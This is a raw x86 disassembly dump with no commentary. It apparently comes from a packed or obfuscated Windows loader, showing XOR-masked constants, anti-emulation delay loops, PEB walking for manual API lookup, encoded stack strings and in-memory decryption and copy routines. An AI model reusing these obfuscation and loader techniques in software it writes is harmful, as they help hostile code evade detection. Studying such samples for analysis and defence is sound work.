  419735:	mov    dl,BYTE PTR [ecx]
  419737:	inc    DWORD PTR [esp+0x38]
  41973b:	shl    ebx,0x8
  41973e:	mov    BYTE PTR [esp+0x20],dl
  419742:	mov    ecx,ebx
  419744:	movzx  edx,WORD PTR [ebp+0x0]
  419748:	shr    ecx,0xb
  41974b:	imul   ecx,edx
  41974e:	cmp    DWORD PTR [esp+0x20],ecx
  419752:	jae    0x41976b
  419754:	mov    ebx,ecx
  419756:	mov    ecx,0x800
  41975b:	sub    ecx,edx
  41975d:	shr    ecx,0x5
  419760:	add    WORD PTR [ebp+0x0],cx
  419764:	add    eax,eax
  419766:	lea    ebp,[esp+0x40]
  41976a:	ret    
  41976b:	shr    edx,0x5
  41976e:	sub    DWORD PTR [esp+0x20],ecx
  419772:	sub    ebx,ecx
  419774:	sub    WORD PTR [ebp+0x0],dx
  419778:	add    eax,eax
  41977a:	add    eax,0x1
  41977d:	lea    ebp,[esp+0x40]
  419781:	ret    
  419782:	push   ebp
  419783:	mov    ebp,esp
  419785:	sub    esp,0x104
  41978b:	push   ebx
  41978c:	push   esi
  41978d:	push   edi
  41978e:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  419795:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41979c:	mov    eax,DWORD PTR [ebp+0x8]
  41979f:	mov    DWORD PTR [ebp+0x8],eax
  4197a2:	mov    ecx,DWORD PTR [ebp-0x14]
  4197a5:	mov    ebx,0x7510899
  4197aa:	xor    ecx,ebx
  4197ac:	mov    eax,0x3272e0
  4197b1:	add    ecx,eax
  4197b3:	mov    DWORD PTR [ebp-0x28],ecx
  4197b6:	mov    ecx,DWORD PTR [ebp-0x14]
  4197b9:	xor    ecx,ebx
  4197bb:	add    ecx,eax
  4197bd:	mov    DWORD PTR [ebp-0x40],ecx
  4197c0:	mov    ecx,DWORD PTR [ebp-0x14]
  4197c3:	xor    ecx,ebx
  4197c5:	add    ecx,eax
  4197c7:	mov    DWORD PTR [ebp-0x3c],ecx
  4197ca:	mov    ecx,DWORD PTR [ebp-0x14]
  4197cd:	xor    ecx,ebx
  4197cf:	add    ecx,eax
  4197d1:	mov    DWORD PTR [ebp-0xa0],ecx
  4197d7:	mov    DWORD PTR [ebp-0x50],0xf89f05b9
  4197de:	mov    DWORD PTR [ebp-0x3c],0xf89cb5b9
  4197e5:	mov    DWORD PTR [ebp-0x4c],0xf89c85bd
  4197ec:	push   0x25
  4197ee:	pop    ecx
  4197ef:	mov    DWORD PTR [ebp-0x2c],ecx
  4197f2:	mov    DWORD PTR [ebp-0x2c],ecx
  4197f5:	push   0x65
  4197f7:	pop    ecx
  4197f8:	mov    DWORD PTR [ebp-0x2c],ecx
  4197fb:	mov    DWORD PTR [ebp-0x2c],ecx
  4197fe:	mov    DWORD PTR [ebp-0x2c],0x4d
  419805:	mov    DWORD PTR [ebp-0x2c],0x43
  41980c:	mov    ecx,DWORD PTR [ebp-0x14]
  41980f:	xor    ecx,ebx
  419811:	add    ecx,eax
  419813:	mov    DWORD PTR [ebp-0x2c],ecx
  419816:	mov    ecx,DWORD PTR [ebp-0x14]
  419819:	xor    ecx,ebx
  41981b:	add    ecx,eax
  41981d:	mov    DWORD PTR [ebp-0x2c],ecx
  419820:	mov    DWORD PTR [ebp-0x24],0x257
  419827:	mov    DWORD PTR [ebp-0x34],0x35
  41982e:	mov    DWORD PTR [ebp-0x10],0x79
  419835:	lea    edi,[ebp-0xe4]
  41983b:	lea    esi,[ebp-0x104]
  419841:	call   0x41a45b
  419846:	dec    DWORD PTR [ebp-0x10]
  419849:	jne    0x419835
  41984b:	dec    DWORD PTR [ebp-0x34]
  41984e:	jne    0x41982e
  419850:	dec    DWORD PTR [ebp-0x24]
  419853:	jne    0x419827
  419855:	mov    DWORD PTR [ebp-0x24],0x400d
  41985c:	mov    eax,DWORD PTR [ebp-0x14]
  41985f:	xor    eax,ebx
  419861:	mov    esi,0x3272e0
  419866:	add    eax,esi
  419868:	mov    DWORD PTR [ebp-0x8],eax
  41986b:	mov    eax,DWORD PTR [ebp-0x14]
  41986e:	and    DWORD PTR [ebp-0x94],0x0
  419875:	xor    eax,ebx
  419877:	add    eax,esi
  419879:	mov    DWORD PTR [ebp-0x38],eax
  41987c:	mov    eax,fs:0x18
  419882:	mov    DWORD PTR [ebp-0x94],eax
  419888:	mov    eax,DWORD PTR [eax+0x30]
  41988b:	mov    DWORD PTR [ebp-0x98],eax
  419891:	mov    eax,DWORD PTR [eax+0xc]
  419894:	mov    DWORD PTR [ebp-0xc0],eax
  41989a:	mov    eax,DWORD PTR [ebp+0x8]
  41989d:	lea    ecx,[ebp-0x94]
  4198a3:	mov    DWORD PTR [eax+0x1a0],ecx
  4198a9:	mov    eax,DWORD PTR [ebp+0x8]
  4198ac:	lea    ecx,[ebp-0x98]
  4198b2:	mov    DWORD PTR [eax+0x1a4],ecx
  4198b8:	mov    eax,DWORD PTR [ebp+0x8]
  4198bb:	push   DWORD PTR [ebp+0x8]
  4198be:	lea    ecx,[ebp-0xc0]
  4198c4:	mov    DWORD PTR [eax+0x1a8],ecx
  4198ca:	call   0x41bc94
  4198cf:	mov    ecx,DWORD PTR [ebp-0x14]
  4198d2:	xor    ecx,ebx
  4198d4:	add    ecx,esi
  4198d6:	cmp    ecx,eax
  4198d8:	je     0x419bb5
  4198de:	mov    eax,DWORD PTR [ebp+0x8]
  4198e1:	mov    eax,DWORD PTR [eax+0x194]
  4198e7:	mov    ecx,DWORD PTR [eax]
  4198e9:	mov    eax,DWORD PTR [ebp+0x8]
  4198ec:	mov    eax,DWORD PTR [eax+0x194]
  4198f2:	mov    eax,DWORD PTR [eax]
  4198f4:	add    eax,DWORD PTR [ecx+0x3c]
  4198f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4198fa:	mov    ecx,DWORD PTR [ecx+0x1d8]
  419900:	lea    edx,[ebp-0xc4]
  419906:	push   edx
  419907:	mov    edx,DWORD PTR [ebp+0x8]
  41990a:	mov    edx,DWORD PTR [edx+0x18c]
  419910:	mov    edx,DWORD PTR [edx]
  419912:	add    edx,DWORD PTR [eax+0x88]
  419918:	push   0x4
  41991a:	push   DWORD PTR [eax+0x8c]
  419920:	push   edx
  419921:	call   DWORD PTR [ecx+0x1c]
  419924:	push   DWORD PTR [ebp+0x8]
  419927:	mov    edi,DWORD PTR [ebp+0x8]
  41992a:	mov    eax,DWORD PTR [ebp+0x8]
  41992d:	mov    edx,DWORD PTR [eax+0x1b8]
  419933:	mov    DWORD PTR [ebp-0x68],0x80e0f06
  41993a:	mov    DWORD PTR [ebp-0x64],0x10a051f
  419941:	mov    WORD PTR [ebp-0x60],0x7a39
  419947:	mov    DWORD PTR [ebp-0x90],0x23f0f21
  419951:	mov    DWORD PTR [ebp-0x8c],0x6390819
  41995b:	mov    DWORD PTR [ebp-0x88],0x2419020a
  419965:	mov    DWORD PTR [ebp-0x84],0x81d050d
  41996f:	mov    DWORD PTR [ebp-0x80],0x7a391f01
  419976:	mov    DWORD PTR [ebp-0x7c],0x23f0f21
  41997d:	mov    DWORD PTR [ebp-0x78],0x6390819
  419984:	mov    DWORD PTR [ebp-0x74],0x2419020a
  41998b:	mov    DWORD PTR [ebp-0x70],0x81d050d
  419992:	mov    DWORD PTR [ebp-0x6c],0x7a131f01
  419999:	call   0x41bcc3
  41999e:	push   eax
  41999f:	mov    eax,DWORD PTR [ebp+0x8]
  4199a2:	mov    eax,DWORD PTR [eax+0x1a8]
  4199a8:	push   DWORD PTR [eax]
  4199aa:	call   0x41b965
  4199af:	test   eax,eax
  4199b1:	jne    0x419a03
  4199b3:	mov    eax,DWORD PTR [ebp+0x8]
  4199b6:	mov    eax,DWORD PTR [eax+0x1d8]
  4199bc:	mov    edi,DWORD PTR [ebp+0x8]
  4199bf:	add    eax,0x4
  4199c2:	mov    DWORD PTR [ebp-0x20],eax
  4199c5:	mov    eax,DWORD PTR [ebp+0x8]
  4199c8:	mov    edx,DWORD PTR [eax+0x1b8]
  4199ce:	call   0x41bcc3
  4199d3:	push   eax
  4199d4:	mov    eax,DWORD PTR [ebp-0x20]
  4199d7:	call   DWORD PTR [eax]
  4199d9:	test   eax,eax
  4199db:	jne    0x419a03
  4199dd:	mov    eax,DWORD PTR [ebp+0x8]
  4199e0:	mov    eax,DWORD PTR [eax+0x1d8]
  4199e6:	mov    edi,DWORD PTR [ebp+0x8]
  4199e9:	add    eax,0x10
  4199ec:	mov    DWORD PTR [ebp-0x20],eax
  4199ef:	mov    eax,DWORD PTR [ebp+0x8]
  4199f2:	mov    edx,DWORD PTR [eax+0x1b8]
  4199f8:	call   0x41bcc3
  4199fd:	push   eax
  4199fe:	mov    eax,DWORD PTR [ebp-0x20]
  419a01:	call   DWORD PTR [eax]
  419a03:	mov    eax,DWORD PTR [ebp-0x14]
  419a06:	mov    ecx,DWORD PTR [ebp-0x24]
  419a09:	xor    eax,ebx
  419a0b:	add    eax,esi
  419a0d:	cmp    eax,ecx
  419a0f:	je     0x419b8e
  419a15:	mov    eax,DWORD PTR [ebp-0x18]
  419a18:	xor    eax,ebx
  419a1a:	mov    ecx,0xffcd8d20
  419a1f:	sub    ecx,eax
  419a21:	add    ecx,DWORD PTR [ebp-0x24]
  419a24:	mov    eax,DWORD PTR [ebp-0x8]
  419a27:	cmp    eax,ecx
  419a29:	ja     0x419b8e
  419a2f:	mov    DWORD PTR [ebp-0x34],0x0
  419a36:	push   DWORD PTR [ebp+0x8]
  419a39:	mov    edi,DWORD PTR [ebp+0x8]
  419a3c:	mov    eax,DWORD PTR [ebp+0x8]
  419a3f:	mov    edx,DWORD PTR [eax+0x1b4]
  419a45:	call   0x41bcc3
  419a4a:	push   eax
  419a4b:	mov    eax,DWORD PTR [ebp+0x8]
  419a4e:	mov    eax,DWORD PTR [eax+0x1a8]
  419a54:	push   DWORD PTR [eax]
  419a56:	call   0x41b965
  419a5b:	mov    ecx,DWORD PTR [ebp+0x8]
  419a5e:	mov    ecx,DWORD PTR [ecx+0x19c]
  419a64:	mov    DWORD PTR [ecx],eax
  419a66:	mov    eax,DWORD PTR [ebp+0x8]
  419a69:	mov    edi,DWORD PTR [eax+0x1d8]
  419a6f:	mov    esi,DWORD PTR [ebp+0x8]
  419a72:	xor    eax,eax
  419a74:	lea    edx,[ebp-0x7c]
  419a77:	call   0x41bcf9
  419a7c:	push   eax
  419a7d:	mov    eax,DWORD PTR [ebp+0x8]
  419a80:	mov    eax,DWORD PTR [eax+0x19c]
  419a86:	push   DWORD PTR [eax]
  419a88:	call   DWORD PTR [edi+0x8]
  419a8b:	mov    DWORD PTR [ebp-0x20],eax
  419a8e:	mov    eax,DWORD PTR [ebp+0x8]
  419a91:	mov    edi,DWORD PTR [eax+0x1d8]
  419a97:	mov    esi,DWORD PTR [ebp+0x8]
  419a9a:	xor    eax,eax
  419a9c:	lea    edx,[ebp-0x90]
  419aa2:	call   0x41bcf9
  419aa7:	push   eax
  419aa8:	mov    eax,DWORD PTR [ebp+0x8]
  419aab:	mov    eax,DWORD PTR [eax+0x19c]
  419ab1:	push   DWORD PTR [eax]
  419ab3:	call   DWORD PTR [edi+0x8]
  419ab6:	and    DWORD PTR [ebp-0x1c],0x0
  419aba:	mov    eax,DWORD PTR [ebp-0x1c]
  419abd:	and    eax,0x7
  419ac0:	add    eax,0x31
  419ac3:	push   eax
  419ac4:	call   DWORD PTR [ebp-0x20]
  419ac7:	test   eax,eax
  419ac9:	jne    0x419ad0
  419acb:	and    DWORD PTR [ebp-0x10],eax
  419ace:	jmp    0x419af8
  419ad0:	mov    eax,DWORD PTR [ebp+0x8]
  419ad3:	mov    edi,DWORD PTR [eax+0x1d8]
  419ad9:	mov    esi,DWORD PTR [ebp+0x8]
  419adc:	xor    eax,eax
  419ade:	lea    edx,[ebp-0x68]
  419ae1:	call   0x41bcf9
  419ae6:	push   eax
  419ae7:	mov    eax,DWORD PTR [ebp+0x8]
  419aea:	mov    eax,DWORD PTR [eax+0x198]
  419af0:	push   DWORD PTR [eax]
  419af2:	call   DWORD PTR [edi+0x8]
  419af5:	mov    DWORD PTR [ebp-0x10],eax
  419af8:	inc    DWORD PTR [ebp-0x1c]
  419afb:	cmp    DWORD PTR [ebp-0x1c],0x10
  419aff:	jb     0x419aba
  419b01:	mov    eax,DWORD PTR [ebp-0x18]
  419b04:	mov    esi,DWORD PTR [ebp+0x8]
  419b07:	xor    eax,ebx
  419b09:	mov    edi,0x3272e0
  419b0e:	add    eax,edi
  419b10:	lea    edx,[ebp-0xe4]
  419b16:	call   0x41bcf9
  419b1b:	push   eax
  419b1c:	mov    eax,DWORD PTR [ebp-0x14]
  419b1f:	mov    esi,DWORD PTR [ebp+0x8]
  419b22:	xor    eax,ebx
  419b24:	add    eax,edi
  419b26:	lea    edx,[ebp-0x104]
  419b2c:	call   0x41bcf9
  419b31:	push   eax
  419b32:	call   DWORD PTR [ebp-0x10]
  419b35:	mov    ecx,DWORD PTR [ebp-0x14]
  419b38:	xor    ecx,ebx
  419b3a:	add    ecx,edi
  419b3c:	cmp    ecx,eax
  419b3e:	jne    0x419b47
  419b40:	mov    DWORD PTR [ebp-0x34],0x1
  419b47:	mov    eax,DWORD PTR [ebp-0x18]
  419b4a:	mov    ecx,DWORD PTR [ebp-0x8]
  419b4d:	xor    eax,ebx
  419b4f:	lea    eax,[eax+ecx*1+0x3272e0]
  419b56:	mov    DWORD PTR [ebp-0x8],eax
  419b59:	mov    eax,DWORD PTR [ebp-0x34]
  419b5c:	test   eax,eax
  419b5e:	je     0x419b72
  419b60:	mov    eax,DWORD PTR [ebp-0x18]
  419b63:	mov    ecx,DWORD PTR [ebp-0x38]
  419b66:	xor    eax,ebx
  419b68:	lea    eax,[eax+ecx*1+0x3272e0]
  419b6f:	mov    DWORD PTR [ebp-0x38],eax
  419b72:	mov    eax,DWORD PTR [ebp-0x18]
  419b75:	xor    eax,ebx
  419b77:	mov    ecx,0xffcd8d20
  419b7c:	sub    ecx,eax
  419b7e:	add    ecx,DWORD PTR [ebp-0x24]
  419b81:	mov    eax,DWORD PTR [ebp-0x8]
  419b84:	cmp    eax,ecx
  419b86:	jbe    0x419a2f
  419b8c:	mov    esi,edi
  419b8e:	mov    eax,DWORD PTR [ebp-0x38]
  419b91:	mov    ecx,DWORD PTR [ebp-0x8]
  419b94:	cmp    ecx,eax
  419b96:	jne    0x419ba9
  419b98:	push   DWORD PTR [ebp+0x8]
  419b9b:	lea    eax,[ebp-0x40]
  419b9e:	push   eax
  419b9f:	call   0x41c772
  419ba4:	mov    DWORD PTR [ebp-0x28],eax
  419ba7:	jmp    0x419bb5
  419ba9:	mov    eax,DWORD PTR [ebp-0x28]
  419bac:	mov    ecx,DWORD PTR [ebp-0x18]
  419baf:	xor    ecx,ebx
  419bb1:	add    ecx,esi
  419bb3:	xor    DWORD PTR [eax],ecx
  419bb5:	mov    eax,DWORD PTR [ebp-0x14]
  419bb8:	mov    ecx,DWORD PTR [ebp-0x28]
  419bbb:	xor    eax,ebx
  419bbd:	add    eax,esi
  419bbf:	cmp    eax,ecx
  419bc1:	je     0x41a339
  419bc7:	mov    eax,DWORD PTR [ebp-0x14]
  419bca:	mov    ecx,DWORD PTR [ebp-0x40]
  419bcd:	xor    eax,ebx
  419bcf:	add    eax,esi
  419bd1:	cmp    eax,ecx
  419bd3:	je     0x41a339
  419bd9:	mov    eax,DWORD PTR [ebp-0x14]
  419bdc:	xor    eax,ebx
  419bde:	add    eax,esi
  419be0:	jmp    0x419bfe
  419be2:	mov    edi,DWORD PTR [ebp-0x28]
  419be5:	mov    cl,al
  419be7:	and    cl,0x1f
  419bea:	or     dl,0xff
  419bed:	sub    dl,cl
  419bef:	add    BYTE PTR [edi+eax*1],dl
  419bf2:	mov    ecx,DWORD PTR [ebp-0x18]
  419bf5:	xor    ecx,ebx
  419bf7:	lea    eax,[eax+ecx*1+0x3272e0]
  419bfe:	mov    ecx,DWORD PTR [ebp-0x40]
  419c01:	cmp    eax,ecx
  419c03:	jb     0x419be2
  419c05:	mov    eax,DWORD PTR [ebp-0x40]
  419c08:	mov    DWORD PTR [ebp-0x24],eax
  419c0b:	mov    eax,DWORD PTR [ebp-0x28]
  419c0e:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  419c15:	mov    DWORD PTR [ebp-0xbc],eax
  419c1b:	mov    edi,0xf89c85b8
  419c20:	mov    DWORD PTR [ebp-0x30],edi
  419c23:	mov    eax,DWORD PTR [ebp-0x38]
  419c26:	xor    eax,ebx
  419c28:	add    eax,esi
  419c2a:	mov    DWORD PTR [ebp-0xc],eax
  419c2d:	mov    eax,DWORD PTR [ebp-0x38]
  419c30:	xor    eax,ebx
  419c32:	add    eax,esi
  419c34:	mov    DWORD PTR [ebp-0x8],eax
  419c37:	mov    DWORD PTR [ebp-0x48],0xf89c85d9
  419c3e:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  419c45:	mov    eax,DWORD PTR [ebp-0x38]
  419c48:	mov    ecx,DWORD PTR [ebp-0x24]
  419c4b:	xor    eax,ebx
  419c4d:	add    eax,esi
  419c4f:	cmp    ecx,eax
  419c51:	je     0x419e50
  419c57:	jmp    0x419e2c
  419c5c:	mov    ecx,DWORD PTR [ebp-0xc]
  419c5f:	mov    eax,DWORD PTR [ebp-0x24]
  419c62:	sub    eax,ecx
  419c64:	mov    ecx,DWORD PTR [ebp-0x48]
  419c67:	xor    ecx,ebx
  419c69:	add    ecx,esi
  419c6b:	xor    edx,edx
  419c6d:	div    ecx
  419c6f:	mov    DWORD PTR [ebp-0x8],eax
  419c72:	mov    eax,DWORD PTR [ebp-0x54]
  419c75:	mov    ecx,DWORD PTR [ebp-0x8]
  419c78:	xor    eax,ebx
  419c7a:	add    eax,esi
  419c7c:	cmp    ecx,eax
  419c7e:	jbe    0x419c8a
  419c80:	mov    eax,DWORD PTR [ebp-0x54]
  419c83:	xor    eax,ebx
  419c85:	add    eax,esi
  419c87:	mov    DWORD PTR [ebp-0x8],eax
  419c8a:	mov    eax,DWORD PTR [ebp-0x48]
  419c8d:	mov    ecx,DWORD PTR [ebp-0x8]
  419c90:	xor    eax,ebx
  419c92:	add    eax,esi
  419c94:	imul   eax,ecx
  419c97:	mov    DWORD PTR [ebp-0x8],eax
  419c9a:	mov    eax,DWORD PTR [ebp-0x38]
  419c9d:	mov    ecx,DWORD PTR [ebp-0x8]
  419ca0:	xor    eax,ebx
  419ca2:	add    eax,esi
  419ca4:	cmp    ecx,eax
  419ca6:	je     0x419e1a
  419cac:	mov    eax,DWORD PTR [ebp-0x8]
  419caf:	mov    DWORD PTR [ebp-0x10],eax
  419cb2:	mov    eax,DWORD PTR [ebp-0xc]
  419cb5:	add    eax,DWORD PTR [ebp-0xbc]
  419cbb:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  419cc2:	mov    DWORD PTR [ebp-0x34],edi
  419cc5:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  419ccf:	mov    DWORD PTR [ebp-0x8],eax
  419cd2:	mov    DWORD PTR [ebp-0x2c],0xf89c85ba
  419cd9:	mov    DWORD PTR [ebp-0x1c],edi
  419cdc:	mov    eax,DWORD PTR [ebp-0x20]
  419cdf:	xor    eax,ebx
  419ce1:	add    eax,esi
  419ce3:	jmp    0x419dd9
  419ce8:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  419cf2:	mov    DWORD PTR [ebp-0xb8],0xf89c85ad
  419cfc:	mov    eax,DWORD PTR [ebp-0x1c]
  419cff:	mov    ecx,DWORD PTR [ebp-0x44]
  419d02:	xor    eax,ebx
  419d04:	add    eax,esi
  419d06:	imul   eax,ecx
  419d09:	mov    ecx,DWORD PTR [ebp-0x8]
  419d0c:	mov    al,BYTE PTR [eax+ecx*1]
  419d0f:	mov    BYTE PTR [ebp-0x2],al
  419d12:	mov    eax,DWORD PTR [ebp-0x1c]
  419d15:	mov    ecx,DWORD PTR [ebp-0x44]
  419d18:	xor    eax,ebx
  419d1a:	add    eax,esi
  419d1c:	imul   eax,ecx
  419d1f:	mov    ecx,DWORD PTR [ebp-0xa8]
  419d25:	xor    ecx,ebx
  419d27:	add    eax,ecx
  419d29:	mov    ecx,DWORD PTR [ebp-0x8]
  419d2c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  419d34:	mov    ecx,DWORD PTR [ebp-0xb0]
  419d3a:	xor    ecx,ebx
  419d3c:	lea    eax,[ecx+eax*1+0x3272e0]
  419d43:	movzx  ecx,BYTE PTR [ebp-0x2]
  419d47:	xor    ecx,eax
  419d49:	mov    BYTE PTR [ebp-0x2],cl
  419d4c:	mov    al,BYTE PTR [ebp-0x2]
  419d4f:	mov    ecx,DWORD PTR [ebp-0x1c]
  419d52:	mov    edx,DWORD PTR [ebp-0x44]
  419d55:	xor    ecx,ebx
  419d57:	add    ecx,esi
  419d59:	imul   ecx,edx
  419d5c:	mov    edx,DWORD PTR [ebp-0x8]
  419d5f:	mov    BYTE PTR [ecx+edx*1],al
  419d62:	mov    eax,DWORD PTR [ebp-0x1c]
  419d65:	mov    ecx,DWORD PTR [ebp-0x44]
  419d68:	xor    eax,ebx
  419d6a:	add    eax,esi
  419d6c:	imul   eax,ecx
  419d6f:	mov    ecx,DWORD PTR [ebp-0x8]
  419d72:	mov    al,BYTE PTR [eax+ecx*1]
  419d75:	mov    BYTE PTR [ebp-0x2],al
  419d78:	mov    eax,DWORD PTR [ebp-0x1c]
  419d7b:	mov    ecx,DWORD PTR [ebp-0x44]
  419d7e:	xor    eax,ebx
  419d80:	add    eax,esi
  419d82:	imul   eax,ecx
  419d85:	mov    ecx,DWORD PTR [ebp-0x34]
  419d88:	xor    ecx,ebx
  419d8a:	add    eax,ecx
  419d8c:	mov    ecx,DWORD PTR [ebp-0x8]
  419d8f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  419d97:	mov    ecx,DWORD PTR [ebp-0xb8]
  419d9d:	xor    ecx,ebx
  419d9f:	lea    eax,[ecx+eax*1+0x3272e0]
  419da6:	movzx  ecx,BYTE PTR [ebp-0x2]
  419daa:	xor    ecx,eax
  419dac:	mov    BYTE PTR [ebp-0x2],cl
  419daf:	mov    al,BYTE PTR [ebp-0x2]
  419db2:	mov    ecx,DWORD PTR [ebp-0x1c]
  419db5:	mov    edx,DWORD PTR [ebp-0x44]
  419db8:	xor    ecx,ebx
  419dba:	add    ecx,esi
  419dbc:	imul   ecx,edx
  419dbf:	mov    edx,DWORD PTR [ebp-0x8]
  419dc2:	mov    BYTE PTR [ecx+edx*1],al
  419dc5:	mov    eax,DWORD PTR [ebp-0x2c]
  419dc8:	mov    ecx,DWORD PTR [ebp-0x34]
  419dcb:	xor    eax,ebx
  419dcd:	xor    ecx,ebx
  419dcf:	add    eax,esi
  419dd1:	add    ecx,esi
  419dd3:	imul   eax,ecx
  419dd6:	add    eax,DWORD PTR [ebp-0x44]
  419dd9:	mov    DWORD PTR [ebp-0x44],eax
  419ddc:	mov    eax,DWORD PTR [ebp-0x44]
  419ddf:	mov    ecx,DWORD PTR [ebp-0x10]
  419de2:	cmp    ecx,eax
  419de4:	jb     0x419ce8
  419dea:	mov    eax,DWORD PTR [ebp-0x34]
  419ded:	mov    ecx,DWORD PTR [ebp-0x10]
  419df0:	xor    eax,ebx
  419df2:	add    eax,esi
  419df4:	imul   eax,ecx
  419df7:	mov    ecx,DWORD PTR [ebp-0x20]
  419dfa:	xor    ecx,ebx
  419dfc:	add    ecx,esi
  419dfe:	or     eax,ecx
  419e00:	mov    ecx,DWORD PTR [ebp-0x30]
  419e03:	xor    ecx,ebx
  419e05:	add    eax,ecx
  419e07:	mov    ecx,DWORD PTR [ebp-0x30]
  419e0a:	xor    ecx,ebx
  419e0c:	add    eax,ecx
  419e0e:	mov    ecx,DWORD PTR [ebp-0xc]
  419e11:	lea    eax,[eax+ecx*1+0x64e5c0]
  419e18:	jmp    0x419e29
  419e1a:	mov    eax,DWORD PTR [ebp-0x30]
  419e1d:	mov    ecx,DWORD PTR [ebp-0xc]
  419e20:	xor    eax,ebx
  419e22:	lea    eax,[eax+ecx*1+0x3272e0]
  419e29:	mov    DWORD PTR [ebp-0xc],eax
  419e2c:	mov    eax,DWORD PTR [ebp-0x30]
  419e2f:	xor    eax,ebx
  419e31:	mov    ecx,0xffcd8d20
  419e36:	sub    ecx,eax
  419e38:	add    ecx,DWORD PTR [ebp-0x24]
  419e3b:	mov    eax,DWORD PTR [ebp-0x30]
  419e3e:	mov    edx,DWORD PTR [ebp-0xc]
  419e41:	xor    eax,ebx
  419e43:	add    eax,esi
  419e45:	imul   eax,edx
  419e48:	cmp    eax,ecx
  419e4a:	jbe    0x419c5c
  419e50:	mov    eax,DWORD PTR [ebp-0x14]
  419e53:	mov    ecx,DWORD PTR [ebp-0x40]
  419e56:	mov    eax,DWORD PTR [ebp+0x8]
  419e59:	mov    edx,DWORD PTR [ebp-0x4c]
  419e5c:	mov    eax,DWORD PTR [eax+0x1d8]
  419e62:	xor    edx,ebx
  419e64:	add    edx,esi
  419e66:	push   edx
  419e67:	mov    edx,DWORD PTR [ebp-0x3c]
  419e6a:	xor    edx,ebx
  419e6c:	add    edx,esi
  419e6e:	push   edx
  419e6f:	push   ecx
  419e70:	mov    DWORD PTR [ebp-0x2c],ecx
  419e73:	mov    ecx,DWORD PTR [ebp-0x14]
  419e76:	xor    ecx,ebx
  419e78:	add    ecx,esi
  419e7a:	push   ecx
  419e7b:	call   DWORD PTR [eax+0x14]
  419e7e:	mov    edi,eax
  419e80:	mov    eax,DWORD PTR [ebp-0x14]
  419e83:	xor    eax,ebx
  419e85:	add    eax,esi
  419e87:	cmp    eax,edi
  419e89:	je     0x419ee4
  419e8b:	mov    eax,DWORD PTR [ebp-0x14]
  419e8e:	jmp    0x419eb1
  419e90:	mov    ecx,DWORD PTR [ebp-0x28]
  419e93:	xor    eax,ebx
  419e95:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e0]
  419e9c:	mov    BYTE PTR [eax+edi*1+0x3272e0],cl
  419ea3:	mov    ecx,DWORD PTR [ebp-0x18]
  419ea6:	xor    ecx,ebx
  419ea8:	lea    eax,[ecx+eax*1+0x3272e0]
  419eaf:	xor    eax,ebx
  419eb1:	mov    ecx,DWORD PTR [ebp-0x40]
  419eb4:	sub    ecx,esi
  419eb6:	xor    ecx,ebx
  419eb8:	cmp    eax,ecx
  419eba:	jne    0x419e90
  419ebc:	mov    eax,DWORD PTR [ebp+0x8]
  419ebf:	mov    ecx,DWORD PTR [ebp-0x50]
  419ec2:	mov    eax,DWORD PTR [eax+0x1d8]
  419ec8:	xor    ecx,ebx
  419eca:	add    ecx,esi
  419ecc:	push   ecx
  419ecd:	mov    ecx,DWORD PTR [ebp-0x14]
  419ed0:	xor    ecx,ebx
  419ed2:	add    ecx,esi
  419ed4:	push   ecx
  419ed5:	push   DWORD PTR [ebp-0x28]
  419ed8:	call   DWORD PTR [eax+0x18]
  419edb:	mov    eax,DWORD PTR [ebp-0x2c]
  419ede:	mov    DWORD PTR [ebp-0x28],edi
  419ee1:	mov    DWORD PTR [ebp-0x40],eax
  419ee4:	mov    edi,DWORD PTR [ebp-0x28]
  419ee7:	mov    eax,DWORD PTR [ebp-0x18]
  419eea:	mov    ecx,DWORD PTR [ebp-0x14]
  419eed:	xor    eax,ebx
  419eef:	mov    DWORD PTR [ebp-0x2c],edi
  419ef2:	add    eax,esi
  419ef4:	mov    DWORD PTR [ebp-0x5c],0x39122a12
  419efb:	mov    DWORD PTR [ebp-0x58],0x27123f12
  419f02:	jmp    0x419f36
  419f04:	xor    ecx,ebx
  419f06:	mov    dl,BYTE PTR [ebp+ecx*1+0x327284]
  419f0d:	xor    dl,0x73
  419f10:	sub    dl,0x9
  419f13:	mov    DWORD PTR [ebp-0x3c],ecx
  419f16:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272e0]
  419f1e:	movzx  edx,dl
  419f21:	cmp    ecx,edx
  419f23:	jne    0x419f40
  419f25:	mov    ecx,DWORD PTR [ebp-0x18]
  419f28:	mov    edx,DWORD PTR [ebp-0x3c]
  419f2b:	xor    ecx,ebx
  419f2d:	lea    ecx,[ecx+edx*1+0x3272e0]
  419f34:	xor    ecx,ebx
  419f36:	cmp    ecx,0xf89c85b1
  419f3c:	jne    0x419f04
  419f3e:	jmp    0x419f47
  419f40:	mov    eax,DWORD PTR [ebp-0x14]
  419f43:	xor    eax,ebx
  419f45:	add    eax,esi
  419f47:	mov    ecx,DWORD PTR [ebp-0x14]
  419f4a:	xor    ecx,ebx
  419f4c:	add    ecx,esi
  419f4e:	cmp    ecx,eax
  419f50:	je     0x41a0c3
  419f56:	mov    eax,DWORD PTR [edi+0x8]
  419f59:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  419f60:	mov    DWORD PTR [ebp-0x3c],0xf89cc316
  419f67:	mov    DWORD PTR [ebp-0x48],0xf89cb5b9
  419f6e:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  419f75:	mov    DWORD PTR [ebp-0x10],eax
  419f78:	mov    eax,DWORD PTR [ebp+0x8]
  419f7b:	mov    ecx,DWORD PTR [ebp-0x20]
  419f7e:	xor    ecx,ebx
  419f80:	add    ecx,esi
  419f82:	push   ecx
  419f83:	mov    ecx,DWORD PTR [ebp-0x48]
  419f86:	mov    eax,DWORD PTR [eax+0x1d8]
  419f8c:	xor    ecx,ebx
  419f8e:	add    ecx,esi
  419f90:	push   ecx
  419f91:	mov    ecx,DWORD PTR [ebp-0x3c]
  419f94:	xor    ecx,ebx
  419f96:	add    ecx,esi
  419f98:	push   ecx
  419f99:	mov    ecx,DWORD PTR [ebp-0xc]
  419f9c:	xor    ecx,ebx
